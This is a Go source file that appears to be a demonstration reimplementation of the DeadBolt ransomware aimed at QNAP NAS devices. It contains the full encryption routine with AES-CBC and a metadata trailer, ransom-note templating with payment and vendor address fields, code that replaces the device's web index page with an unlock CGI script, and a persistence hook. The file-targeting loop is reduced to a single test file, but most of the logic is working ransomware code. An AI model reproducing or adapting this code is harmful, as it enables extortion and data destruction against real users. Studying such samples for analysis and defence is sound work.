package main


import (
  "os"
  "io"
  "fmt"
  "bytes"
  "strings"
  "embed"
  "bufio"
  "errors"
  "path/filepath"
  "encoding/json"
  "encoding/hex"
  "encoding/binary"
  "crypto/rand"
  "crypto/aes"
  "crypto/cipher"
  "crypto/sha256"
  "compress/gzip"

  "deadbolt_demo/shutil"
  "deadbolt_demo/qnap"
)


const (
  // Encrypted file marker
  EncMarker string = "DEADBOLT"
  // Ransom extension
  RansomExt string = ".deadbolt"
  // Ransom note name
  RansomNoteName string = "!!!_IMPORTANT_README_WHERE_ARE_MY_FILES_!!!.txt"
)


const (
  // PID file name
  PIDFileName string = "deadbolt.pid"  // "/tmp/deadbolt.pid"
  // Status file name
  StatusFileName string = "deadbolt.status"  // "/tmp/deadbolt.status"
  // Finish file name
  FinishFileName string = "deadbolt.finish"  // "/tmp/deadbolt.finish"
)

// Exclude paths
var ExcludePaths = [...]string{
  "/dev",
  "/sys",
  "/proc",
  "/usr/share",
  "/usr/bin",
  "/usr/sbin",
  "/sbin" }
// Exclude names
var ExcludeNames = [...]string{
  ".swap",
  ".qpkg",
  ".samba",
  ".@root",
  ".@sys",
  ".ssh",
  "@system",
  "@zlog",
  ".system",
  ".@system",
  ".@ezsync",
  ".@iscsi",
  ".@snapshots",
  ".@thumbnail",
  ".@tmp",
  ".@uploads",
  ".@trashcan",
  ".@plugins",
  ".@CNID" }


const (
  // Metadata size
  MetadataSize = 128
  // Client ID size
  ClientIDSize = 16
  // Key hash size
  KeyHashSize = 32
  // AES key Size
  AESKeySize = 16
  // AES IV Size
  AESIVSize = 16
  // AES block Size
  AESBlockSize = 16
)


// ConfigFile structure
type ConfigFile struct {
  ClientID          string `json:"client_id"`
  MasterKeyHash     string `json:"master_key_hash"`
  Key               string `json:"key"`
  PaymentAddress    string `json:"payment_address"`
  PaymentAmount     string `json:"payment_amount"`
  VendorAddress     string `json:"vendor_address"`
  VendorName        string `json:"vendor_name"`
  VendorEmail       string `json:"vendor_email"`
  VendorAmount      string `json:"vendor_amount"`
  VendorAmountFull  string `json:"vendor_amount_full"`
}


// Context structure
type Context struct {
  ExtList        map[string]struct{}
  Unk0           []byte
  Key            []byte
  KeyHash        []byte
  MasterKeyHash  []byte
  ClientID       []byte
  Cfg            ConfigFile
  NumDecrypted   int64
  PathList       []string
}


//go:embed res/ext.txt
//go:embed res/note.html
//go:embed res/note.txt
//go:embed res/unlock_cgi.php
//go:embed res/unlock_cgi.sh
//go:embed res/uuid
var res_content embed.FS


// Variables
var vars = map[string]string{}


// Main
func main() {

  ctx := new(Context)

  if (len(os.Args) != 4) {
    PrintHelp(os.Args[0])
  }

  var err error

  if os.Args[1] == "-e" {

    // Encrypt
    err = ctx.Encrypt(os.Args[2], os.Args[3])
    if err != nil { panic(err) }

  } else if os.Args[1] == "-d" {

    // Decrypt
    err = ctx.Decrypt(os.Args[2], os.Args[3])
    if err != nil { panic(err) }

  } else {

    // Print program usage
    PrintHelp(os.Args[0])
  }

  fmt.Printf("done\n")
}


// Print program usage
func PrintHelp(appName string) {

  fmt.Printf("encrypt usage: %s -e <config> <dir>\n", appName)
  fmt.Printf("decrypt usage: %s -d <key> <dir>\n", appName)
  os.Exit(0)
}


// Encrypt routine
func (ctx *Context) Encrypt(cfgName, paths string) (err error) {

  ctx.PathList = strings.Split(paths, ",")

  // Remove DeadBolt previous files
  ctx.RemovePrevFiles()

  // Load extension list
  err = ctx.LoadExtList()
  if err != nil { return err }

  // Load configuration
  cfgData, err := os.ReadFile(cfgName)
  if err != nil { return err }

  err = json.Unmarshal(cfgData, &ctx.Cfg)
  if err != nil { return err }

  // Convert encryption key
  buf := []byte(ctx.Cfg.Key)
  n, err := hex.Decode(buf, buf)
  if err != nil { return err }
  ctx.Key = buf[:n]

//  // Wipe config file
//  WipeFile(cfgName)

//  // Remove config file
//  os.Remove(cfgName)

  // Get encryption key hash
  err = ctx.GetKeyHash()
  if err != nil { return err }

  // Convert master key hash
  err = ctx.ConvertMasterKeyHash()
  if err != nil { return err }

  // Convert client ID
  err = ctx.ConvertClientID()
  if err != nil { return err }

  // Prepare
  err = ctx.Prepare()
  if err != nil { return err }

  // Extract persist shell-script
  err = qnap.ExtractPersistScript()
  if err != nil { return err }

  for _, path := range ctx.PathList {

    _, err = os.Stat(path)
    if os.IsNotExist(err) {
      continue
    }

    // Encrypt path
    ctx.EncryptPath(path)
    // Write ransom note
    //ransomNotePath := fmt.Sprintf("%s/%s", path, RansomNoteName)
    ransomNotePath := RansomNoteName
    err = ctx.WriteRansomNote(ransomNotePath)
    if err != nil { return err }
  }

  return nil
}


// Decrypt routine
func (ctx *Context) Decrypt(key, paths string) (err error) {

  buf := []byte(key)
  n, err := hex.Decode(buf, buf)
  if (err != nil) || (n != AESKeySize) {
    fmt.Printf("bad formed key.\n")
    os.Exit(1)
  }

  ctx.Key = buf[:n]

  ctx.PathList = strings.Split(paths, ",")

  // Write PID
  err = ctx.WritePID()
  if err != nil { return err }

  // Update decryption status
  ctx.NumDecrypted = 0
  err = ctx.UpdateStatus()
  if err != nil { return err }

  // Get encryption key hash
  err = ctx.GetKeyHash()
  if err != nil { return err }

  for _, path := range ctx.PathList {
    // Decrypt path
    ctx.DecryptPath(path)
  }

  // Write finish
  err = ctx.WriteFinish()
  if err != nil { return err }

  // Remove persist shell-script
  return qnap.RemovePersistScript()
}


// Remove DeadBolt previous files
func (ctx *Context) RemovePrevFiles() (err error) {

  os.Remove(PIDFileName)
  os.Remove(StatusFileName)
  os.Remove(FinishFileName)
  return nil
}


// Load extension list
func (ctx *Context) LoadExtList() (err error) {

  lines, err := ReadEmbedTextFile(&res_content, "res/ext.txt")
  if err != nil { return err }

  ctx.ExtList = make(map[string]struct{})

  for _, line := range lines {
    ctx.ExtList[line] = struct{}{}
  }

  return nil
}


func ReadEmbedTextFile(fs *embed.FS,
                       fileName string) (lines []string, err error) {

  f, err := fs.Open(fileName)
  if err != nil { return nil, err }

  defer f.Close()

  scanner := bufio.NewScanner(f)

  for scanner.Scan() {
    lines = append(lines, scanner.Text())
  }

  return lines, nil
}


// Get encryption key hash
func (ctx *Context) GetKeyHash() (err error) {

  h := sha256.New()
  h.Reset()
  h.Write(ctx.Key)
  ctx.KeyHash = h.Sum(nil)
  return nil
}


// Convert master key hash
func (ctx *Context) ConvertMasterKeyHash() (err error) {

  buf := []byte(ctx.Cfg.MasterKeyHash)
  n, err := hex.Decode(buf, buf)
  if err != nil { return err }

  if n != KeyHashSize { return errors.New("l") }

  ctx.MasterKeyHash = buf[:n]

  return nil
}


// Convert client ID
func (ctx *Context) ConvertClientID() (err error) {

  buf := []byte(ctx.Cfg.ClientID)
  n, err := hex.Decode(buf, buf)
  if err != nil { return err }

  if n != ClientIDSize { return errors.New("l") }

  ctx.ClientID = buf[:n]
  return nil
}


// Prepare
func (ctx *Context) Prepare() (err error) {

  f, err := res_content.Open("res/note.html")
  if err != nil { return err }

  defer f.Close()

  ransomNoteHtmlData, err := io.ReadAll(f)
  if err != nil { return err }

  f.Close()

  f, err = res_content.Open(fmt.Sprintf("res/unlock_cgi.%s", "sh"))
  if err != nil { return err }

  defer f.Close()

  unlockCgiData, err := io.ReadAll(f)
  if err != nil { return err }

  f.Close()

  ransomNoteHtmlText := string(ransomNoteHtmlData)
  unlockCgiText := string(unlockCgiData)

  vars["{PAYMENT_ADDRESS}"] = ctx.Cfg.PaymentAddress
  vars["{PAYMENT_AMOUNT}"] = ctx.Cfg.PaymentAmount

  var buf []byte

  buf = make([]byte, 2 * len(ctx.KeyHash))
  hex.Encode(buf, ctx.KeyHash)
  vars["{KEYHASH}"] = string(buf)

  buf = make([]byte, 2 * len(ctx.MasterKeyHash))
  hex.Encode(buf, ctx.MasterKeyHash)
  vars["{MASTER_KEYHASH}"] = string(buf)

  vars["{VENDOR_ADDRESS}"] = ctx.Cfg.VendorAddress
  vars["{VENDOR_AMOUNT}"] = ctx.Cfg.VendorAmount
  vars["{VENDOR_AMOUNT_FULL}"] = ctx.Cfg.VendorAmountFull
  vars["{VENDOR_EMAIL}"] = ctx.Cfg.VendorEmail
  vars["{VENDOR_NAME}"] = ctx.Cfg.VendorName

  vars["{CGI_URL}"] = qnap.GetCGIURL()

  for name, val := range vars {
    ransomNoteHtmlText = strings.ReplaceAll(ransomNoteHtmlText, name, val)
  }

  // Get EXE path
  myPath, err := GetMyPath()
  if err != nil { return err }

  var zwBuf bytes.Buffer
  zw := gzip.NewWriter(&zwBuf)
  _, err = zw.Write([]byte(ransomNoteHtmlText))
  if err != nil { return err }
  zw.Close()

  buf = make([]byte, 2 * len(ctx.KeyHash))
  hex.Encode(buf, ctx.KeyHash)
  vars["{KEYHASH}"] = string(buf)

  buf = make([]byte, 2 * len(ctx.MasterKeyHash))
  hex.Encode(buf, ctx.MasterKeyHash)
  vars["{MASTER_KEYHASH}"] = string(buf)

  vars["{PATH_PID_FILENAME}"] = PIDFileName
  vars["{PATH_STATUS_FILENAME}"] = StatusFileName
  vars["{PATH_FINISH_FILENAME}"] = FinishFileName

  vars["{INDEX_PAGE_COMPRESSED}"] = shutil.BinToStr(zwBuf.Bytes())

  vars["{PATH_CRYPT}"] = strings.Join(ctx.PathList, ",")

  vars["{PATH_TOOL}"] = myPath

  for name, val := range vars {
    unlockCgiText = strings.ReplaceAll(unlockCgiText, name, val)
  }

  // Rename index.html to index.html.bak
  os.Rename(qnap.GetIndexHtmlPath(),
            fmt.Sprintf("%s.bak", qnap.GetIndexHtmlPath()))

  return os.WriteFile(qnap.GetIndexHtmlPath(), []byte(unlockCgiText), 0755)
}


// Write ransom note
func (ctx *Context) WriteRansomNote(fileName string) (err error) {

  f, err := res_content.Open("res/note.txt")
  if err != nil { return err }

  defer f.Close()

  fileData, err := io.ReadAll(f)
  if err != nil { return err }

  ransomNoteText := string(fileData)

  vars["{VENDOR_ADDRESS}"] = ctx.Cfg.VendorAddress
  vars["{VENDOR_AMOUNT}"] = ctx.Cfg.VendorAmount
  vars["{VENDOR_AMOUNT_FULL}"] = ctx.Cfg.VendorAmountFull
  vars["{VENDOR_EMAIL}"] = ctx.Cfg.VendorEmail
  vars["{VENDOR_NAME}"] = ctx.Cfg.VendorName

  for name, val := range vars {
    ransomNoteText = strings.ReplaceAll(ransomNoteText, name, val)
  }

  return os.WriteFile(fileName, []byte(ransomNoteText), 0755)
}


// Encrypt path
func (ctx *Context) EncryptPath(path string) {

  // Multithreaded code is skipped ;-)
  // ...

  // Encrypt demo file
  filePath, err := filepath.Abs("test.dat")
  if err != nil {
    filePath = "test.dat"
  }
  ctx.EncryptFile(filePath, RansomExt)
}


type EncryptWriter struct {
  r   io.Reader
  c   cipher.Block
  bm  cipher.BlockMode
  fw  encFileWriter
}


type encFileWriter interface {
  io.Writer
  Read(b []byte) (n int, err error)
}


func (w *EncryptWriter) Read(b []byte) (n int, err error) {

  n, err = w.r.Read(b)
  if n <= 0 { return 0, io.EOF }

  rem := n & 0x0F
  if rem != 0 {
     n = n - rem + 0x10
  }

  w.bm.CryptBlocks(b[:n], b[:n])

  return n, err
}


// Create encrypt writer
func CreateEncryptWriter(key, iv []byte,
                         r io.Reader) (w *EncryptWriter,  err error) {

  cypher, err := aes.NewCipher(key)
  if err != nil { return nil, err }

  crypter := cipher.NewCBCEncrypter(cypher, iv)

  return &EncryptWriter{r: r, c: cypher, bm: crypter}, nil
}


// Encrypt file
func (ctx *Context) EncryptFile(fileName, ransomExt string) (err error) {

  iv := make([]byte, AESIVSize)
  rand.Read(iv)

  newFileName := fmt.Sprintf("%s%s", fileName, ransomExt)

  f, err := os.OpenFile(fileName, os.O_RDWR, 0755)
  if err != nil { return err }

  defer f.Close()

  fileInfo, err := f.Stat()
  if err != nil { return err }

  var zeroBuf [AESBlockSize]byte

  fileSize := fileInfo.Size()
  rem := fileSize & 0x0F
  if rem != 0 {
    f.Seek(0, 2)
    f.Write(zeroBuf[:AESBlockSize - rem])
    f.Sync()
  }

  f.Seek(0, 0)

  f2, err := os.OpenFile(fileName, os.O_RDONLY, 0)
  if err != nil { return err }

  defer f2.Close()

  w, err := CreateEncryptWriter(ctx.Key, iv, f2)
  if err != nil { return err }

  io.Copy(f, w)

  // Write marker
  f.Write([]byte(EncMarker))

  // Write original file size
  buf := make([]byte, 8)
  binary.LittleEndian.PutUint64(buf, uint64(fileSize))
  f.Write(buf)

  // Write client ID
  f.Write(ctx.ClientID)

  // Write AES IV
  f.Write(iv)

  // Write key hash
  f.Write(ctx.KeyHash)

  // Write master key hash
  f.Write(ctx.MasterKeyHash)

  // Write 16 null bytes
  f.Write(zeroBuf[:])

  f2.Close()

  f.Close()

  return os.Rename(fileName, newFileName)
}


// Write PID
func (ctx *Context) WritePID() (err error) {

  pid := fmt.Sprintf("%d\n", os.Getpid())
  return os.WriteFile(PIDFileName, []byte(pid), 0644)
}


// Update decryption status
func (ctx *Context) UpdateStatus() (err error) {

  stat := fmt.Sprintf("%d\n", ctx.NumDecrypted)
  err = os.WriteFile(StatusFileName, []byte(stat), 0644)

  ctx.NumDecrypted += 1

  return err
}


// Write finish
func (ctx *Context) WriteFinish() (err error) {

  return os.WriteFile(FinishFileName, []byte("1"), 0644)
}


// Decrypt path
func (ctx *Context) DecryptPath(path string) {

  // Multithreaded code is skipped ;-)
  // ...

  // Decrypt demo file
  filePath, err := filepath.Abs("test.dat" + RansomExt)
  if err != nil {
    filePath = "test.dat" + RansomExt
  }
  err = ctx.DecryptFile(filePath, RansomExt)
  if err == nil {
    os.Remove(filePath)
  }
}


type DecryptWriter struct {
  r     io.Reader
  pos   int64
  size  int64
  c     cipher.Block
  bm    cipher.BlockMode
  fw    decFileWriter
}


type decFileWriter interface {
  io.Writer
  Read(b []byte) (n int, err error)
}


func (w *DecryptWriter) Read(b []byte) (n int, err error) {

  n, err = w.r.Read(b)
  if n <= 0 { return 0, io.EOF }

  w.pos += int64(n)

  w.bm.CryptBlocks(b[:n], b[:n])

  if w.pos > w.size {
    n -= int(w.pos - w.size)
  }

  return n, err
}


// Create decrypt writer
func CreateDecryptWriter(key, iv []byte,
                         r io.Reader,
                         origFileSize int64) (w *DecryptWriter,  err error) {

  cypher, err := aes.NewCipher(key)
  if err != nil { return nil, err }

  decrypter := cipher.NewCBCDecrypter(cypher, iv)

  w = &DecryptWriter{r: r, size: origFileSize, c: cypher, bm: decrypter}

  return w, nil
}


// Decrypt file
func (ctx *Context) DecryptFile(fileName, ransomExt string) (err error) {

  f, err := os.OpenFile(fileName, os.O_RDONLY, 0)
  if err != nil { return err }

  defer f.Close()

  fileInfo, err := f.Stat()
  if err != nil { return err }

  fileSize := fileInfo.Size()
  if fileSize < MetadataSize { return errors.New("y") }

  metadata := make([]byte, MetadataSize)

  f.Seek(-MetadataSize, 2)

  n, err := f.Read(metadata[:])
  if err != nil { return err }
  if n != MetadataSize { return errors.New("x") }

  f.Seek(0, 0)

  if !bytes.Equal([]byte(EncMarker), metadata[:8]) { return errors.New("z") }

  origFileSize := int64(binary.LittleEndian.Uint64(metadata[8:16]))

  var w *DecryptWriter

  iv := metadata[32 : 32 + AESIVSize]
  keyHash := metadata[48 : 48 + KeyHashSize]

  if bytes.Equal(ctx.KeyHash, keyHash) {

    w, err = CreateDecryptWriter(ctx.Key, iv, f, origFileSize)
    if err != nil { return err }

  } else if bytes.Equal(ctx.KeyHash, metadata[80 : 80 + KeyHashSize]) {

    h1 := sha256.New()
    h1.Reset()
    // Encryption key
    h1.Write(ctx.Key)
    // Client ID
    h1.Write(metadata[16 : 16 + ClientIDSize])
    digest1 := h1.Sum(nil)

    key := digest1[:16]

    h2 := sha256.New()
    h2.Reset()
    h2.Write(key)
    digest2 := h2.Sum(nil)

    if !bytes.Equal(digest2, keyHash) { return errors.New("z") }

    w, err = CreateDecryptWriter(key, iv, f, origFileSize)
    if err != nil { return err }

  } else {

    return errors.New("z")
  }

  newFileName := fileName
  if (len(newFileName) >= len(ransomExt)) &&
     (newFileName[len(newFileName) - len(ransomExt):] == ransomExt) {
    newFileName = newFileName[:len(newFileName) - len(ransomExt)]
  }

  f2, err := os.OpenFile(fileName, os.O_RDWR, 0755)
  if err != nil { return err }

  defer f2.Close()

  io.Copy(f2, w)

  f.Close()

  f2.Truncate(origFileSize)

  f2.Close()

  err = os.Rename(fileName, newFileName)
  if err == nil {
    // Update decryption status
    ctx.UpdateStatus()
  }

  return nil
}


// Get EXE path
func GetMyPath() (path string, err error) {

  path = os.Args[0]
  //if path[0] != '/' { return "", errors.New("invalid argv0") }
  return path, nil
}


// Wipe file data
func WipeFile(fileName string) (err error) {

  f, err := os.OpenFile(fileName, os.O_WRONLY, 0)
  if err != nil { return err }

  defer f.Close()

  fileInfo, err := f.Stat()
  if err != nil { return err }

  fileSize := fileInfo.Size()

  var zeroBuf [32768]byte

  var off int64 = 0
  var size int64 = fileSize
  var blockSize int = 0

  for size != 0 {

    if size > int64(len(zeroBuf)) {
      blockSize = len(zeroBuf)
    } else {
      blockSize = int(size)
    }
    n, _ := f.WriteAt(zeroBuf[:blockSize], off)
    off += int64(n)
    size -= int64(blockSize)
  }

  return nil
}
